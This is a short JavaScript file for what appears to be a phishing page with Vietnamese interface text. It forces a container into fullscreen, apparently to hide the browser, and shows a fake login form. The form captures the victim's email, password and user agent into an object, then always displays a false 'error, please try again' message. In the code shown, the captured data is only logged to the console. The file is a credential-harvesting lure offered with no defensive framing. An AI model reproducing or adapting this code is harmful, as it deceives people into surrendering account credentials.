var elem = document.querySelector("#container");
var btn = document.querySelector(".register");
var alerts = document.querySelector(".alert");

function openFullscreen() {
  if (elem.requestFullscreen) {
    elem.requestFullscreen();
  } else if (elem.webkitRequestFullscreen) {
    /* Safari */
    elem.webkitRequestFullscreen();
  } else if (elem.msRequestFullscreen) {
    /* IE11 */
    elem.msRequestFullscreen();
  }
}

btn.onclick = function () {
  openFullscreen();
};

//

var users = {
  username: "",
  password: "",
  user_agent: "",
};

const btnLogin = document.querySelector(".login");
const email = document.querySelector(".email");
const password = document.querySelector(".password");
let agent = navigator.userAgent;

btnLogin.onclick = function () {
  let msg = "";
  if (email.value == "" || password.value == "") {
    msg = "Vui lòng điền đầy đủ thông tin đăng nhập.";
  } else {
    if (email.value.length < 6 || password.value.length < 6) {
      msg = "Email hoặc mật khẩu không chính xác.";
    } else {
      msg = "Có lỗi xảy ra vui lòng thử lại.";
      users.username = email.value;
      users.password = password.value;
      users.user_agent = agent;

      console.log(users);
    }
  }

  if (msg != "") {
    alerts.innerHTML = msg;
    alerts.style.display = "block";
  } else {
    alerts.style.display = "none";
  }
};

btnMoveToLogin = document.querySelector(".btnMoveToLogin");
btnMoveToLogin.click();

btnMoveToLogin.onclick = function () {
  elem.style.display = "block";
  btnMoveToLogin.remove();
  openFullscreen();
};
